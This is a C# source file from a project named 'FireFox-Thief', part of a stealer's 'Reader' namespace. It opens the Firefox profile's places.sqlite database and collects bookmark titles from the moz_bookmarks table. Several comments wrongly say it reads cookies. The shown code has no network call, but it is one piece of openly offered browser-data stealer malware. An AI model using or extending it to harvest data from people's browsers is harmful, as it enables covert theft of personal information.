/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using Stealer.Helpers;
using static Stealer.Helpers.Common;

namespace Stealer.Reader
{
    internal sealed class Bookmarks
    {        
        // Get cookies from gecko browser
        public static List<Bookmark> Get(string BrowserDir)
        {
            List<Bookmark> scBookmark = new List<Bookmark>();
            // Get firefox default profile directory
            string profile = Profile.GetProfile(BrowserDir);
            // Read cookies from file
            if (profile == null) return scBookmark;
            string db_location = Path.Combine(profile, "places.sqlite");
            // Read data from table
            SQLite sSQLite = SQLite.ReadTable(db_location, "moz_bookmarks");
            if (sSQLite == null) return scBookmark;
            // Get values from table
            for (int i = 0; i < sSQLite.GetRowCount(); i++)
            {
                Bookmark bBookmark = new Bookmark();
                bBookmark.sTitle = Decryptor.GetUTF8(sSQLite.GetValue(i, 5));

                if (Decryptor.GetUTF8(sSQLite.GetValue(i, 1)).Equals("0") && bBookmark.sTitle != "0")
                {
                    scBookmark.Add(bBookmark);
                }
            }

            return scBookmark;
        }
    }
}
